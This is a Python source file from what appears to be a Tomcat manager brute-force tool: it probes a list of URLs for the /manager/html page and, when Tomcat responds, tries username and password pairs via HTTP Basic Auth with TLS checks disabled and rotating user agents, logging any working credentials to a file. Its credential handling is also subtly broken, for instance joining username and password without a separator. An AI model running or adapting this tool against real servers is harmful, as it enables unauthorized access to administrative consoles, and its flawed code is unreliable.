from requests import get

from urllib3 import disable_warnings
disable_warnings()

from rich import print

import base64

from src.core.manager import *


def connect() -> str:
    "Try to connect to the URL"

    for url in get_urls():
        path = f"{url}/manager/html"

        try:
            response = get(path, **props)
            body = response.text
            status_code = response.status_code

            verify = lambda success = 401 or 200: status_code == success and 'Tomcat' in body
            (bruteforce(path)) if verify() else print(f"[red][ERR] Connection problems with {url} | {status_code}")

        except Exception as e:
            return print(f"[red][!] - An error occurred: {e} [/]")


def bruteforce(path) -> str:
    "Bruteforce the Tomcat login"

    print(f"[cyan][INF] Tomcat detected in: {path} | Starting bruteforce...")

    for u, p in zip(get_usernames(), get_passwords()):

        auth_string = u+p
        auth_string = auth_string.encode('utf-8')
        auth_string = base64.b64encode(auth_string)
        auth_string = f'Basic {auth_string}'

        chars = "b'"
        auth_string = auth_string.replace(chars, "")
        auth_string = auth_string.replace("'", "")

        auth_header = {
            'Authorization': auth_string,
            'User-Agent': return_user_agent()
        }

        response = get(path, verify=False, headers=auth_header)
        status_code = response.status_code

        if(status_code == 200):
            print(f"[green][INF] {u+p} | {path} \n")

            with open("src/core/result/out.txt", "a+") as file:
                file.write(f"{path} | {u+p} | {auth_string}")

        else:
            pass